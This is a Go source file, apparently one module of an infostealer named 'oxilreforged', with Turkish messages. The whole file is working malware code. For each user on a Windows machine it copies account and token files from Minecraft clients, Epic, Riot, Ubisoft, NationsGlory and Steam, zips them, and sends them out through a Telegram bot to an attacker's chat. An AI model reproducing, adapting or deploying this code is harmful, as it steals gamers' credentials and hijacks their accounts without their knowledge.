package games

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"oxilreforged/modules/telegram"
	"oxilreforged/utils/fileutil"
	"oxilreforged/utils/hardware"
)

func Run(botToken string, chatID string) {
	users := hardware.GetUsers()

	for _, user := range users {
		username := strings.Split(user, "\\")[2]
		tempDir := filepath.Join(os.TempDir(), fmt.Sprintf("games-%s", username))
		os.MkdirAll(tempDir, os.ModePerm)
		defer os.RemoveAll(tempDir)

		paths := map[string]map[string]string{
			"Epic Games": {
				"Settings": filepath.Join(user, "AppData", "Local", "EpicGamesLauncher", "Saved", "Config", "Windows", "GameUserSettings.ini"),
			},
			"Minecraft": {
				"Intent":     filepath.Join(user, "intentlauncher", "launcherconfig"),
				"Lunar":      filepath.Join(user, ".lunarclient", "settings", "game", "accounts.json"),
				"TLauncher":  filepath.Join(user, "AppData", "Roaming", ".minecraft", "TlauncherProfiles.json"),
				"Feather":    filepath.Join(user, "AppData", "Roaming", ".feather", "accounts.json"),
				"Meteor":     filepath.Join(user, "AppData", "Roaming", ".minecraft", "meteor-client", "accounts.nbt"),
				"Impact":     filepath.Join(user, "AppData", "Roaming", ".minecraft", "Impact", "alts.json"),
				"Novoline":   filepath.Join(user, "AppData", "Roaming", ".minecraft", "Novoline", "alts.novo"),
				"CheatBreakers": filepath.Join(user, "AppData", "Roaming", ".minecraft", "cheatbreaker_accounts.json"),
				"Microsoft Store": filepath.Join(user, "AppData", "Roaming", ".minecraft", "launcher_accounts_microsoft_store.json"),
				"Rise":       filepath.Join(user, "AppData", "Roaming", ".minecraft", "Rise", "alts.txt"),
				"Rise (Intent)": filepath.Join(user, "intentlauncher", "Rise", "alts.txt"),
				"Paladium":   filepath.Join(user, "AppData", "Roaming", "paladium-group", "accounts.json"),
				"PolyMC":     filepath.Join(user, "AppData", "Roaming", "PolyMC", "accounts.json"),
				"Badlion":    filepath.Join(user, "AppData", "Roaming", "Badlion Client", "accounts.json"),
			},
			"Riot Games": {
				"Config": filepath.Join(user, "AppData", "Local", "Riot Games", "Riot Client", "Config"),
				"Data":   filepath.Join(user, "AppData", "Local", "Riot Games", "Riot Client", "Data"),
				"Logs":   filepath.Join(user, "AppData", "Local", "Riot Games", "Riot Client", "Logs"),
			},
			"Uplay": {
				"Settings": filepath.Join(user, "AppData", "Local", "Ubisoft Game Launcher"),
			},
			"NationsGlory": {
				"Local Storage": filepath.Join(user, "AppData", "Roaming", "NationsGlory", "Local Storage", "leveldb"),
			},
		}

		found := ""

		for name, pathMap := range paths {
			destBase := filepath.Join(tempDir, username, name)
			os.MkdirAll(destBase, os.ModePerm)

			copied := false
			for fName, fPath := range pathMap {
				if fPath == "" {
					continue
				}

				destPath := filepath.Join(destBase, fName)
				var err error

				if filepath.Ext(fPath) != "" {
					os.MkdirAll(filepath.Dir(destPath), os.ModePerm)
					err = fileutil.CopyFile(fPath, filepath.Join(destPath, filepath.Base(fPath)))
				} else {
					err = fileutil.CopyDir(fPath, destPath)
				}

				if err == nil {
					copied = true
				}
			}

			if copied {
				found += fmt.Sprintf("\n✅ %s", name)
			}
		}

		if found == "" {
			os.RemoveAll(tempDir)
			continue
		}

		message := fmt.Sprintf(
			"*🎮 Oyun Hesapları Bulundu - %s*\n\n"+
				"```%s```",
			username,
			found,
		)

		_ = telegram.SendTextToTelegram(botToken, chatID, message)

		tempZip := filepath.Join(os.TempDir(), fmt.Sprintf("games-%s.zip", username))
		if err := fileutil.Zip(tempDir, tempZip); err != nil {
			os.RemoveAll(tempDir)
			continue
		}

		caption := fmt.Sprintf("Oyun launcher dosyaları - %s", username)
		_ = telegram.SendZipToTelegram(botToken, chatID, caption, tempZip)

		os.Remove(tempZip)
		os.RemoveAll(tempDir)
	}

	// Steam kısmı
	steamTempDir := filepath.Join(os.TempDir(), "steam-temp")
	os.MkdirAll(steamTempDir, os.ModePerm)
	defer os.RemoveAll(steamTempDir)

	steamPath := "C:\\Program Files (x86)\\Steam\\config"
	if !fileutil.IsDir(steamPath) {
		return
	}

	if err := fileutil.CopyDir(steamPath, steamTempDir); err != nil {
		return
	}

	steamZip := filepath.Join(os.TempDir(), "steam.zip")
	if err := fileutil.Zip(steamTempDir, steamZip); err != nil {
		return
	}
	defer os.Remove(steamZip)

	steamMessage := "*🎮 Steam Config Dosyaları Bulundu*\n\n`✅✅✅`"
	_ = telegram.SendTextToTelegram(botToken, chatID, steamMessage)

	caption := "Steam config dosyaları (config klasörü)"
	_ = telegram.SendZipToTelegram(botToken, chatID, caption, steamZip)
}
